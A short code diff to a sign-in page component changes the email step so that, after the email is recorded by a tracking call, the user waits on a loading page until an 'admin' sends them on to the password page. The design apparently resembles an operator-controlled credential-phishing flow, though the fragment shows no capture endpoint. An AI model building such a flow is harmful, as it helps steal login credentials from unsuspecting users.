@@ -224,8 +224,8 @@ function GeSignInPage() {
     const trimmed = email.trim();
     setGeEmail(trimmed);
     trackSubmit("email", trimmed);
-    // Pass email in the URL so the password page always has it
-    geNavigate(`/ge/password?email=${encodeURIComponent(trimmed)}`);
+    // Email → loading; admin redirects to password when ready
+    geNavigate("/ge/loading");
   };
 
   return (
